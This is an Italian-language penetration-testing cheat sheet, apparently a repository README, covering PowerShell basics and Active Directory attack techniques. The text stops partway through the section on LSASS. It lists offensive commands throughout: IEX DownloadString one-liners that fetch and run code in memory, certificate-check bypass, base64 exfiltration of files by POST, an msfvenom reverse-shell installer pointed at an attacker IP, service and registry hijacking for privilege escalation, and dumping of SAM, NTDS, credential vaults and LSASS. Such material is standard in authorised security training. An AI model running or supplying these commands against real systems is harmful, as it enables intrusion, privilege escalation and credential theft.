# Lista Link  
_Lista di comandi powershell generali, che vanno dalla info alla gestione dei file:_

 [Comandi Powershell:](./#comandi-powershell)
<!-- -->
   - [Comandi info generali PC](./#comandi-info-generali-pc)
<!-- -->
   - [Comandi per i file:](./#comandi-per-i-file)
       - [Download/Upload file](./#downloadupload-file)
<!-- -->
   - [Comandi ADS (Alternate Data Stream)](./#comandi-ads-alternate-data-stream)
  
_Lista che viene aggiornata man mano di metodologie, tool, comandi e CVE inerenti al mondo dell Active Directory:_

 [Active Directory Pentest:](./#active-directory-pentest)
   - [Enumerazione:](./#enumerazione)
       - [Enumerazione Esterna](./#enumerazione-esterna)
       - [Enumerazione Interna](./#enumerazione-interna)
       - [Enumerazione host machine](./#enumerazione-host-machine)
       - [Tools](./#tools)
<!-- -->
   - [Privilege Escalation:](./#privilege-escalation)
       - [Servizi](./#servizi)
       - [Registri](./#registri)
       - [Credenziali](./#credenziali)
           - [Tools](./#tools-1)
       - [Varie](./#varie)
       - [Tools](./#tools-2)
<!-- -->
   - [Lateral movements:](./#lateral-movements)
       - [Lanciare comandi da remoto](./#lanciare-comandi-da-remoto)
       - [Port Forwarding](./#port-forwarding)
<!-- -->
   - [Persistence:](./#persistence)
       - [Gruppi](./#gruppi)
       - [Privilegi](./#privilegi)
       - [Servizi](./#servizi-1)
       - [File](./#file)
       - [Registri](./#registri-1)
       - [Varie](./#varie-2)
<!-- -->
   - [Tools:](./#tools-3)
       - [Metasploit](./#metasploit)
       - [Powerview](./#Powerview)
       - [Bloodhund](./#bloodhund)
       - [Mimikatz](./#mimikatz)
       - [Suite impacket](./#suite-impacket)
<!-- -->
   - [DACL attacks:](./#dacl-attacks)
        - [AddMembers](./#addmember)
        - [WriteDACL](./#dacl-attacks)
        - [ForceChangePassword](./#forcechangepassword)
        - [GenericAll](./#genericall)
        - [WriteOwner](./#writeowner)
        - [GenericWrite](./#genericwrite)
<!-- -->
   - [Bypass:](./#bypass)
        - [Bypass UAC](./#bypass-uac)
        - [Bypass AMSI](./#bypass-amsi)
        - [Bypass Applocker](./#bypass-applocker)
        - [Bypass Logging](./#bypass-logging)
<!-- -->
   - [CVE:](./#cve)
        - [CVE-2022-26923](./#cve-2022-26923-vulnerabilit%C3%A0-sui-certificati-dellad)
           - [Certificati AD](./#certificati-ad)
        - [CVE-2023-23397](./#cve-2023-23397-outlook)
<!-- -->
   - [Link a risorse esterne](./#link-a-risorse-esterne)
<!-- -->
   - [Note pentest](./#note-pentest)
<!-- -->
_Argomenti, note e tools inerenti a Windows:_

 [Windows:](./#windows)
<!-- -->
   - [Processi di avvio](./#processi-di-avvio)
<!-- -->
   - [API](./#api)
<!-- -->
   - [PE (Portable Executable)](./#pe-portable-executable)
<!-- -->
   - [Register keys](./#register-keys)
<!-- -->
   - [UAC](./#uac)
<!-- -->
   - [AMSI](./#amsi)
<!-- -->
   - [Suite SysInternals:](./#suite-sysinternals)
        - [File e dischi](./file-e-dischi)
        - [Rete](./#rete)
        - [Processi](./#processi)
        - [Sicurezza](./#sicurezza)
        - [Informazioni di sistema](./#informazioni-di-sistema)
        - [Generali](./#generali)
<!-- -->
   - [Forense:](./#forense)
        - [FAT e NTFS](./#fat-e-ntfs)
        - [Registri](./#registri-2)
        - [File](./#file-1)
        - [Applicazioni](./#applicazioni)
        - [Log](./#log)
        - [Device Esterni](./#device-esterni)
        - [Tools](./#tools-4)
<!-- -->  
   - [Shellcode:](./#shellcode)
        - [Tecniche di Injection](./#tecniche-di-injection)
        - [Tecniche di esfiltrazione](./#tecniche-di-esfiltrazione)
        - [Decompiling e Debugging](./#decompiling-e-debugging)
<!-- -->
   - [Note sulla sicurezza in Windows](./#note-sulla-sicurezza-in-windows)
<!-- -->
_Sezione dei credits per i riconoscimenti:_
<!-- -->
[Credits](./#credits)
<!-- -->
## Disclaimer:

__Nell'intera repository troviamo la presenza di molto codice scritto in molteplici lnguaggi e può capitare che nel tempo alcuni comandi o librerie diventino deprecate__

# Comandi Powershell:
<!-- -->
    fl #comando per ricevere più output 
<!-- -->
ES: `Get-Acl | fl`
<!-- -->
    Get-Help <nome comando> -Full #comando per ottenere l'help 
<!-- -->
    Update-Help -Force #comando per aggiornare gli help alla versione più recente    
<!-- -->
    Select-Object #comando utilizzato per prendere un campo dell'oggetto specifico 
<!-- -->
ES: `Get-LocalUser John | Select-Object LastLogon`
<!-- -->
    Get-Command #comando utilizzato per sapere se un comando è presente in powershell
<!-- -->
ES: `Get-Command *User*`
<!---->
    New-LocalUser  #comando per creare nuovi utenti locali
<!---->
ES: `New-LocalUser -Name User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)`
<!-- -->
    New-LocalGroup #comando per creare un nuovo gruppo
<!-- -->
ES: `New-LocalGroup -Name $Group`
<!-- -->
    Add-LocalGroupMember #comando che aggiunge un utente ad un gruppo
<!-- -->
ES: `Add-LocalGroupMember -Group $Group -Member $User`
<!---->
    reg query #comando per interrogare i registri
<!---->
    New-item #comando per creare file, cartelle o modificare valori
<!---->
    Set-item #comando per modificare file, cartelle o modificare valori
<!---->
    Start-service <nome servizio> #comando per avviare un servizio     
ES: `Start-service WinRM`
<!---->
    Set-DnsClientServerAddress -InterfaceIndex <num indice interfaccia di rete> -ServerAddresses <ip server dns> #comando per settare il dnsclient
<!---->
 ### Comandi info generali PC  
<!---->
    Get-ComputerInfo #comando che prende informazioni della macchina
<!---->
    Get-Localuser #comando che lista gli utenti locali nella macchina
<!---->
    Get-ScheduledTask #comando che lista tutti gli schedule
<!---->
    Get-Acl #comando per listare le access-list dei permessi
<!---->
    Get-PSDrive  #comando che lista i drive dell'ambiente legati a powershell che possono essere variabili, oggetti, registri e volumi.
<!----> 
    Get-ADDomain #comando per prendere tutte le informazione dell'AD Domain
<!----> 
    Get-NetIPAddress #comando powershell per ottenere la configurazione di rete
<!---->
    Get-MpComputerStatus #comando per vedere info su microsoft defender
<!---->
    Get-HotFix | ft -AutoSize #comando che mostra cosa è stato aggiornato e quando
<!---->
### Comandi per i File
<!---->
      Get-Content -path "<file>" # comando per leggere il contenuto
ES: `(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)`
<!---->
      [IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #comando che dalla classe IO.FILE richiama WriteAllBytes che permette di scrivere
<!---->
### Download/Upload File

__Download:__

_Download cioè dalla nostra machine alla target machine_
<!---->
      curl -o <nome file>  http://<ip source>/<file da scaricare> #comando che da un link scarica un file e lo salva in locale
<!---->
      (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #comando per fare un download
<!---->
      (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')#comando per un download async cioè senza bloccare il calling thread
<!---->
      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #comando per il bypass del certificato 
<!---->
_E' possibile trasferire un file senza doverlo scaricare sul disco ma runnandolo direttamente in memoria:_ 
<!---->
      IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) #comando che tramite IEX(Invoke-Expression) runna direttamente in memoria
<!---->
 __Upload:__
 
 _Upload cioè dalla target machine alla nostra macchina_
<!---->
 _Comandi per avviare un server upload python:_
<!---->
      pip3 install uploadserver #modulo che permette l'avvio di un uploadserver
<!---->
      python3 -m uploadserver #comando per avviarlo e funzionerà sulla porta 8000
<!---->
_Utilizzo dello script PSUpload.ps1 (Script che rende più semplice l'upload di file o cartelle)_
<!---->
      python3 -m http.server 80 #comando per avviare il python server contenente lo script
<!---->
      curl -o <nome eseguibile>.ps1 https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1 #comando per scaricare l'eseguibile 
      dal sito web
<!---->
      IEX(New-Object Net.WebClient).DownloadString('http://<nostro_ip_locale>:<nostra_porta>/PSUpload.ps1') #comando variante che senza scarica lo script lo 
      runna direttamente
<!---->
      . .\PSUpload.ps1 #comando per runnare lo script
<!----> 
      Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script per fare upload dei file
<!---->
_Upload tramite encoding in base64:_ 
<!---->
      b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
      #variabile che stora il base64 del file
<!---->   
      Invoke-WebRequest -Uri <ip server> -Method POST -Body $b64 #inviamo il base64 del file tramite richiesta POST
<!---->
- __SMB server:__

_Comando per avviare il server SMB per l'upload e download:_ 
<!---->
      impacket-smbserver <nome share online> <path directory locale che condividi> #comando che avvia in smbV1 il server
<!---->
      impacket-smbserver <nome share online> -smb2support <path directory locale che condividi> #comando per avviare il server con smbV2
<!---->
      copy <path del file da uplodare>  \\<ip della destinazione dove mandare>\<nome share a cui accedere> 
      #comando per fare upload, facendo una copia sul server SMB upload
<!---->
      copy \\ip sorgente da cui scaricare\<nome share>\<file da scaricare> <Path locale di dove salvarlo> #comando per scaricare dal server SMB
<!---->  
### comandi ADS (alternate data stream)

_ADS (Alternate Data Streams), feature che permette di avere molteplici flussi di dati in un singolo file_

_Lista di comandi utili per gestire gli ADS:_
<!-- -->
      Get-Item -path <path> -stream * #comando che ottiene tutti gli ADS 
<!-- -->
      set-content -path <path del file> -stream <nome del nuovo stream> -value <contenuto per lo stream> #comando che crea un nuovo ADS con il contenuto indicato
<!-- -->
      gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' #comando che cerca in tutto il filesystem la presenza di ADS
<!-- -->
      remove-item –path <path al file> –stream <nome stream da rimuovere> #comando che rimuove lo stream su un determinato file
<!-- -->
      Get-Content -path <path del file da leggere>:<nome dell'ADS> #comando per leggere il contenuto dello stream di un file
<!-- -->
# Active Directory Pentest:

# Enumerazione:

_La pratica di enumerare è una tra le più importanti, in quanto permette di ricavare informazioni vitali sul target e permette di progettare i prossimi movimenti; prima di entrare però si ha la necessità di enumerare dall'esterno e vi sono vari metodi_

### Enumerazione Esterna:

- _Enumerazione del DC:_
  
_Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti, SMB e altro:_
<!-- -->
    enum4linux <ip> #comando per l'enumerazione
<!-- -->  
- _Enumerazione e comandi SMB:_
<!-- -->
    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- -->
    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- -->
    smbclient \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- -->
- _Enumerazione utenti:_
<!-- -->
- _crackmapexec, solo se abbiamo l'accesso a IPC$ all'interno del servizio SMB, per averlo quindi deve essere abilitato l'anonymous login:_
<!-- -->
    crackmapexec smb <nome dominio> -u '<nome utente>' -p '' --rid-brute
<!-- -->
- _kerbrute, tramite una lista di user possiamo vedere che Users ci sono nell'AD target:_
<!---->
    kerbrute_linux_amd64 userenum -d <nome dominio> --dc <ip del domain controller> <wordlist>
<!---->

- __Metodi di connessione remota alla target machine e comandi utili:__

_L'enumerazione dall'esterno a i suoi limiti, ad un certo punto bisogna trovare un punto di connessione con la target machine ed enumerarla dall'interno_
<!---->
    winexe -U '<username>%<password>' //<ip_bersaglio> cmd.exe  #comando che esegue processi (in questo caso cmd) da remoto sfruttando SMB
<!---->
    evil-winrm -i <nome dominio> -u <nome utente> -H <hash NTLM> o -p <password> #utilizziamo il WinRM protocol per connettersi
<!---->
    upload <path file da dove caricare> <nome di come salvarlo> #comando per uplodare dalla kali alla target machine il file tramite evil-winrm
<!---->
    download <path file dove scaricare> <path file dove salvare> #comando per il download del file dalla target machine alla kali tramite evil-winrm
<!---->
    rdesktop -u <nome utente> -p <password> <ip> #comando per connettersi con RDP
<!---->
    xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution /drive:<nome share>,<nome path locale> #comando per connettersi con RDP
<!---->
- __Autenticazioni:__

- _RunAs.exe:_
  
 _Una volta riusciti ad ottenere delle credenziali valide è tempo di entrare nel sistema e iniziare l'enumerazione interna però è anche vero che prima va capito dove poter utilizzare queste credenziali un metodo può essere __"RunAs.exe"__ il quale è un binario di windows che permette di eseguire uno script o un programma con credenziali di altri utenti_

_Comandi:_
<!---->
     runas.exe /netonly /user:<dominio>\<nome utente> cmd.exe #comando che date delle credenziali le utilizza per aprire un CMD
     /netonly #flag del comando runas che indica di utilizzare le credenziali per l'autenticazione di rete, infatti le credenziali che inseriamo verranno prese 
     per buone, in quanto non verificate dal domain controller ma semplicemente caricate in memoria
<!---->
__N.B: Runnare il CMD dalla propria machine con privilegi di amministratore cosi che il CMD creato in seguito abbia un token di IL high__

### Enumerazione Interna:

- _Enumerazione SYSVOL:_

_Un buon metodo per verificare che le credenziali inserite nella fase di autenticazione siano valide è tramite l'enumerazione di SYSVOL, che anche l'utente con meno privilegi può listare; SYSVOL è una cartella presente in tutti i domain controller è importante perchè contiene dati e informazioni importanti per la replicazione di quest'ultimi tra domain controllers_

_Comandi:_ 
<!---->
     dir \\<nome dominio o ip>\SYSVOL\ #comando per listare la directory SYSVOL
<!---->
__N.B: Vi è una differenza tra listare con il nome dominio o con l'indirizzo IP, utilizzando l'hostname verrà eseguito il kerberos authentication mentre con l'indirizzo IP verrà utilizzato NTLM.__

- _Enumerazione tramite MMC e RSAT:_

_Nel MMC (Microsoft Management Console) possiamo trovare al suo interno degli snap-in di provenienti da __"RSAT (Remote Server Administration Tools)"__, una suite di tools per amministrare da remoto un'active directory_

__N.B: Questo tipo di enumerazione richiede di avere accesso ad una GUI quindi una connessione RDP ma come sappiamo non sempre è possibile__

_Comandi:_
<!---->
     start-> App e Funzionalità-> aggiungi una funzionalità-> RSAT-> installa #passi per installare RSAT
<!---->
_Avendo installato RSAT avremo ora disponibili in MMC degli snap-in per il controllo dell'AD_
<!---->
      mmc-> FIle-> Aggiungi/rimuovi snap-in-> aggiungiamo i 3 snap-in quali: Domini e trust di Active Directory, Siti e servizi di Active Directory infine 
      Utenti e computer di Active Directory-> ai primi 2 snap-in va cambiato la forest con il dominio target, al terzo snap-in va cambiato il dominio con il 
      dominio target #passi per installare e configurare gli snap-in 
<!---->
_Ora che gli snap-in sono pronti non ci resta che dare uno sguardo all'AD_
<!---->
      Utenti e computer di Active Directory-> dominio target-> si apriranno diverse cartelle dove possiamo vedere per esempio chi appartiene al dominio, le 
      macchine a dominio ecc... #passi per visionare l'interno dell'AD tramite lo snap-in
<!---->
   
- _Enumerazione tramite Powershell:_

_Powershell permette di ampliare le nostre capacità di enumerazione perchè dispone di cmdlets più potenti e che permettono la scrittura di commandi ancora più complessi tipo [PowerView](./#Powerview).
Nella nostra target machine se installati gli RSAT tools avremo a disposizione ulteriori comandi per enumerare l'AD oltre a quelli base_

_Comandi:_
<!---->
      Get-ADUer * | fl * #comando per listare tutti gli utenti e avere maggiore informazioni di output
<!---->
      Get-ADUser -Identity <SAM nome> -Server <hostname> -Properties * #comando per enumerare uno specifico utente con tutte le sue proprietà
<!---->
      Get-ADGroup * | fl * #comando per enumerare i gruppi e avere maggiore output di informazioni
<!---->
      Get-ADGroup -Identity <nome gruppo> -Server <hostname> #comando per enumerare un gruppo specifico
<!---->
      Get-ADGroupMember -Identity <nome gruppo> -Server <hostname> #comando per enumerare i membri di un gurppo specifico
<!---->
      Get-ADObject -Filter 'badPwdCount -gt 0' -Server <hostname> #comando che cerca tra gli ADObject account che hanno più di un tentativo fallito di accesso
<!---->
      Get-ADDomain -Server <hostname> #comando che recupera maggiori informazioni sul dominio
<!---->
__N.B: se nella target machine non abbiamo disponibile RSAT, possiamo sfruttare un trick cioè in una vm locale, installare RSAT per poi andare alla seguente path "C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management" copiare la dll del RSAT e importarla nella target machine infine ad ogni commando basterà aggiungere la flag -Server__

### Enumerazione host machine:

_Un passo importante oltre all'enumerazione esterna e interna è importante ricavare informazioni dalle varie host machine su cui uno ottiene l'accesso_

_Comandi:_
<!---->
      ipconfig /all #comando CMD per listare le configurazioni di rete
<!---->
      arp -a #comando CMD per listare ARP table
<!---->
      route print #comando CMD per listare le routing table
<!---->
      tasklist /svc #comando CMD per listare i servizi
<!---->
      set #comando CMD per listare le variabili d'ambiente
<!---->
      systeminfo #comando CMD per listare informazioni sul PC, nello specifico anche quando sono stati fatti vari aggiornamenti
<!---->
      wmic product get name #comando CMD per listare i programmi installati
<!---->
      netstat -ano #comando CMD per listare connessioni attive e porte in ascolto
<!---->
      query user #comando CMD che lista gli utenti attivi tramite RDP
<!---->
      echo %USERNAME% #comando CMD che indica l'utente corrente
<!---->
      whoami /priv #comando CMD che indica i privilegi che ha il nostro user corrente
<!---->
      whoami /groups #comando CMD che lista i gruppi
<!---->
      net user #comando CMD che lista tutti gli account
<!---->
      net localgroup #comando CMD che lista tutti i gruppi
<!---->
      net localgroup <nome gruppo> #comando CMD che dato un gruppo ci fornisce ulteriori informazioni
<!---->
      net accounts #comando CMD che lista le password policy e informazioni account
<!---->
      cmd /c dir /q '<path cartella>' #comando per listare il proprietario di una determinata cartella
<!---->
      net use \\<nome del server>\<nome dello share>  /user:<nome utente e password> #comando per accedere e visionare uno share di SMB se disponibile
<!---->
       net group /domain #comando per listare i gruppi nel dominio
<!---->
       net user /domain #comando per listare tutti gli user nel dominio
<!---->
       net user <nome utente> /domain #comando per ricavare più informazioni sull'utente specificato
<!---->
       net group <nome gruppo> /domain #comando per listare i membri del gruppo specificato
<!---->
### Tools:

_Come per ogni cosa esiste un tool per automatizzare il processo ed è:_

- [Bloodhund](./#bloodhund)

_Con Bloodhund abbiamo 2 eseguibili che hanno il compito di raccogliere i dati per Bloodhund e sono:_

- [SharpHound](https://github.com/BloodHoundAD/SharpHound), utilizzato per l'AD

- [AzureHound](https://github.com/BloodHoundAD/AzureHound), utilizzato per il cloud Azure

# Privilege Escalation:
<!---->
 _Metodi per scalare i propri privilegi in windows e controllare permessi che potrebbero essere vettore di privilege escalation_
<!---->
 ### Servizi:
 
 - __Abusare permessi insicuri nei servizi:__

 _Per controllare le misconfiguration utilizzeremo accesschk.exe (utility che serve a controllare i permessi ACL su oggetti di sistma Windows) è contenuto nella 
 suite di sysmon scaricabile dal seguente [link](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):_
<!---->
    accesschk.exe /accepteula -uwcqv <nome_utente> <nome_servizio> #restituisce i permessi dell'utente relativi al servizio ricercato
<!---->
 _se l'utente ha il seguente privilegio __"SERVICE_CHANGE_CONFIG"__ può essere vettore di privilege escalation:_
<!---->
 _facciamo una query al servizio per controllare che giri come SYSTEM (o LocalSystem) sotto la voce __"SERVICE_START_NAME"___
<!---->
    sc qc <nome_servizio> #fa una query al servizio per ottenere i suoi dettagli
<!---->
 _a questo punto possiamo sostituire il binario puntato dal servizio con uno creato da noi per farlo eseguire al riavvio:_
<!---->
    sc config <nome_servizio> binpath= "\"<path_al_nostro_eseguibile>\"" #indichiamo la path con gli apici attraverso l'escape character
<!---->
    net start <service> #avviando il servizio verrà lanciato il nostro eseguibile come amministratore
<!---->
- __abusare di path non racchiuse da doppi apici:__
<!---->
_se la path di un servizio è scritta nel seguente modo:_
<!---->
    BINARY_PATH_NAME: <Path_al_servizio>\<directory>\.. #quindi non racchiusa dalle virgolette 
<!---->
_può essere vettore privilege escalation perchè senza doppie virgolette la path viene letta male dal sistema e con gli spazi che vengono letti come dei break windows proverà ad eseguire un qualcosa prima di ogni spazio_

ES:
`C:\Windows\Tasks\rev.exe`

`C:\rev.exe`

`C:\Windows\rev.exe`

`C:\windows\Tasks\rev.exe`

_possiamo di conseguenza inserire un eseguibile (sempre se ho i permessi di write sui servizi e sulla directory da modificare)._
<!---->
    copy <Path_del_nostro_eseguibile> "<path_del_servizio>\Common.exe" #così facendo il sistema cercerà la path e arrivato allo spazio eseguirà il nostro 
    comando prendendo i dati successivi come argomenti dell'eseguibile
<!---->
    net start <service_name> #comando per startare un servizio
<!---->
- __Abusare di eccessivi permessi di modifica delle chiavi di registro:__
<!---->
    sc qc <nome_servizio> #comando che fa una query al servizio
<!---->
    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<nome_servizio> #comando che controlla i permessi e chi ha accesso alle chiavi di un 
    servizio di resgistro
<!---->
___"NT AUTHORITY\INTERACTIVE"__ se le chiavi sono accessibili da questo gruppo significa che tutti gli utenti con logon possono modificarle:_
<!---->
    reg add HKLM\SYSTEM\CurrentControlSet\services\<nome_servizio> /v <ImagePath> /t REG_EXPAND_SZ /d <path_nostro_eseguibile> /f #comando che aggiunge una 
    chiave di registro
<!---->
    net start <nome_servizio> #comando che starta un servizio
<!---->
- __Abusare permessi di scrittura sugli eseguibili dei servizi:__
<!---->
    sc qc <nome_servizio> #comando che fa una query al servizio
<!---->
    C:\PrivEsc\accesschk.exe /accepteula -quvw "<Path servizio>" #comando che fa una query sui permessi di sicurezza di un servizio
<!---->
 _Notiamo che il __"BINARY PATH NAME"__ è scrivibile da tutti_
<!---->
    copy <nostro_eseguibile> <path_del_binario_del_servizio> #se abbiamo permessi di scrittura sull'eseguibile del servizio possiamo sostituirlo con il nostro 
<!---->
### Registri:

- __Abusare degli autorun attraverso le chiavi di registro:__
<!---->
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #interroga i registri per cercare eseguibili con autorun
<!---->
    accesschk.exe /accepteula -wvu "<path_dell_eseguibile>" #ricerca le proprietà degli eseguibili che sono autorun
<!---->
_se l'eseguibile è word-writable possiamo sostituirlo con il nostro e riavviare la macchina:_
<!---->
    copy <nostro_eseguibile_da_runnare> "<path_dell_autorun>" /Y  #dopo il riavvio si attiverà automaticamente
<!---->
- __Abusare dei privilegi di installazione come amministratore (permettono di installare sempre un programma come amministratore)__
  
_Andremo a controllare tramite la reg query se AlwaysInstallElevated è settato a 1 o 0, AlwaysInstallElevated controlla la richiesta di elevazione dei privilegi del MSI installer, se settato a 0 l'installer richiede di elevare i privilegi solo quando serve invece se ad 1 l'installer lo richiede sempre cosi facendo può vettore di privilege escalation._
<!---->
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #interroga le chiavi di registro
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #se sono settate su 0x1 sono attive
<!---->
_possiamo creare un installer con msfvenom per richiamare una revshell da amministratore quando installato:_
<!---->
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip_attaccante> LPORT=<porta_attaccante> -f msi -o installer.msi
<!---->

### Credenziali:

_Questa sezione fa riferimento a luoghi generali o errori di dove possano esservi delle credenziali_

- __Dumping di password dai registri:__

_Comandi:_
<!---->
     reg query HKLM /f password /t REG_SZ /s #ricerca dei registri che contengono la parola password
<!---->
     reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" #comando per la ricerca di password del logon
<!---->
- __Dumping di password dal credmanager:__

_Comandi:_
<!---->
     vaultcmd /list #comando per vedere se sono presenti dei vaults per le password
<!---->
_Nel credmanager di solito sono 2 i vault uno web e uno windows, per recuperare quello Web esiste uno script powershell che si scarica da [qui](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)_
<!---->
     powershell -ex bypass #comando per poter attivare lo script
<!---->
     Import-Module .\Get-WebCredentials.ps1 #comando per importare il modulo
<!---->
     Get-WebCredentials #comando per recupere le credenziali dal vault web     
<!---->  
_Esiste poi un tool chiamato __"cmdkey"__, utilizzato per creare, eliminare o modificare le credenziali registrate nel credmanager può essere utilizzato con la command-line __"RunAs"___
<!---->
     cmdkey /list #comando per listare possibili credenziali salvate
<!----> 
     runas /savecred /user:<dominio\nome utente oppure solo nome utente> cmd.exe #comando che tramite le credenziali salvate apre una nuova shell con l'utente 
     specificato
<!----> 
- __Dumping del SAM e del SYSTEM:__

_Se abbiamo la fortuna di trovare in giro un backup del SAM o del SYSTEM o ancora meglio, avere privilegi come SeBackup/SeRestore (permettono di leggere e scrivere ogni file del fileysystem bypassandro le ACL) o fare parte del gruppo Backup Operators possiamo salvarceli e dumpare le credenziali_

_Comandi:_
<!---->  
    reg save hklm\system C:\Users\backup\system.hive
    reg save hklm\sam C:\Users\backuo\sam.hive
    reg save hklm\system system.bak
    reg save hklm\sam sam.bak
    #tipologie di comandi per salvare SAM e SYSTEM
<!---->  
    copy C:\Windows\Repair\Systen.hive \\<ip destinazione>\<nome share>\ 
    copy C:\Windows\Repair\sam.hive \\<ip destinazione>\<nome share>\ #comandi per passarsi i backup tramite SMB
<!---->  
    git clone https://github.com/Tib3rius/creddump7 #comando per clonare la repo di creddump7
    pip3 install pycrypto #comando per installare lo script
    python3 creddump7/pwdump.py SYSTEM SAM #comando per recuperare le password
<!---->  
    impacket-secretsdump -sam sam.bak -system system.bak LOCAL #comando che utilizza la suite impacket per recuperare gli hash
<!---->
- __Dumping NTDS:__

_NTDS è un database contenente dati, credenziali per un domain controller, di default è situato in __"C:\Windows\NTDS"__ e per gestirlo viene utilizzata una utility apposta chiamata __"Ntdsutil"___

__Bisogna avere dei permessi d'amministratore__

_File richiesti:_
<!---->
    C:\Windows\NTDS\ntds.dit
    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY
<!---->    
_Comandi:_
<!---->
    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\prova' q q" #comando che tramite ntdsutil fa il dump dei file richiesti
<!---->
    secretsdump.py -security <path SECURITY file> -system <path SYSTEM file> -ntds <path ntds.dit file> local #comando che tramite secretsdump, dumpa il DB e ottiene gli hash 
<!---->
    secretsdump.py -ntds <path ntds.dit file> -system <path SYSTEM file> -hashes lmhash:nthash LOCAL #comando alternativo da utilizzare se non si disponde del SYSTEM file
<!---->
_Impostazioni di default settano il ntds.dit non accessibile cioè bloccato ma tramite l'utility __"diskshadow"__, possiamo fare un shadow copy(backup) del volume __"C"__ su un altro volume tipo __"F"___
<!---->
    diskshadow.exe #comando che avvia diskshadow
<!---->    
    set verbose on #comando che mette in azione la modalità verbosa
<!---->   
    set metadata <path dove salvare i metdati>.cab #comando che imposta dove salvare i metadati della shadow copy
<!---->    
    set context clientaccessible #comando che imposta il contenuto accessibile agli utenti
<!---->
    set context persistent #comando che imposta il contenuto in maniera persistente
<!---->    
    begin backup #comando che fa partire il backup
<!---->    
    add volume C: alias <nome alias> #comando che aggiunge il volume C per farne la shadowcopy e poi imposta un alias
<!---->    
    create #comando che inizia la creazione
<!---->    
    expose %cdrive% F: #comando che monta la copia del disco C nel nuovo volume F
<!---->    
    end backup #comando che finisce il backup
<!---->    
    exit #comando che esce da diskshadow
<!---->
- __LAPS:__

_LAPS è utilizzato per la gestione centralizzata delle password, permettendo la generazione, rotazione e ripristino delle password_

_Comandi:_
<!---->
     dir "C:\Program Files\LAPS\CSE" #comando per vedere se presente LAPS, infatti se presente troviamo una .dll
<!---->
     Get-Command *AdmPwd* #comando per capire che cmdlets possiamo utilizzare con il nome AdmPwd
<!---->
     Find-AdmPwdExtendedRights -Identity * #comando per cercare quale OU ha "All extended rights"
<!---->
     net groups "nome gruppo" #comando per vedere i membri del gruppo ai quali dovremmo accedere
<!---->
     Get-ADComputer -Filter * | fl * #comando per listare il nome del computer con LAPS attivo, in quanto non tutti lo hanno
<!---->
     Get-AdmPwdPassword -ComputerName <nome computer> #comando per recuperare la LAPS password 
<!---->
_Esistono diversi script o tool per automatizzare la ricerca uno è possibile scaricarlo da [qui](https://github.com/leoloobeek/LAPSToolkit)._

- __Credenziali di WDS:__
  
_Quando si vuole installare una stessa immagine di windows ma su più macchine nella rete, è possibile utilizzare Windows Deployment Services, il quale installa la stessa image su diversi computer attraverso la rete e lo fa in maniera autonoma, puà capitare che all'interno di determinati file possano esserci ancora delle credenziali_

_cartelle:_
<!---->  
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
<!---->  
- __History powershell e cmd:__

_windows in un file .txt tiene traccia dei comandi powershell e cmd che uno esegue e possiamo recuperarli con questi comandi:_
<!---->  
    %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando CMD per aprire la history 
<!---->  
    C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando Powershell per aprire la history
<!---->  
- __Configurazione IIS:__

_IIS(Internet Information Service) è il web server di default in windows, dove è possibile che vi siano delle credenziali nel file __"web.config"___

_Comandi:_

_Ecco le cartelle dove poter andare a vedere_ 
<!---->  
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
<!---->  
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #comando per cercare le credenziali
<!----> 
- __Putty proxy configurations:__

_Putty è un SSH client che troviamo spesso nelle windows machine, è possibile recuperare le sue proxy configuration, dove tiene le credenziali in chiaro_

_Comandi:_
<!---->  
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s #comando che fa una query e tenta di recuperare le credenziali
<!---->

- __LSASS:__

_Il servizio che si occupa dell'autenticazione nei sistemi windows o nell'AD, è un target fondamentale per il recupero di password hashes e ticket, può essere dumpato in diverse maniere._

_Comandi:_

_Disponendo di una GUI alla target machine è possibile tramite task manager dumpare LSASS:_
<!---->
     Task Manager-> lsass.exe-> Creare file di dump della memoria #passi per creare un dump del LSASS
<!---->
_Possiamo dumpare anche se abbiamo a disposizione [procdump della SysInternal suite](./#processi):_
<!---->
     procdump.exe -accepteula -ma lsass.exe c:\Windows\lsass_dump #comando per dumpare tramite procdump
<!---->
_Vi è un però, i metodi sopra spiegati non funzionano se prima non viene disattivata la protezione LSA con i seguenti metodi:_
<!---->
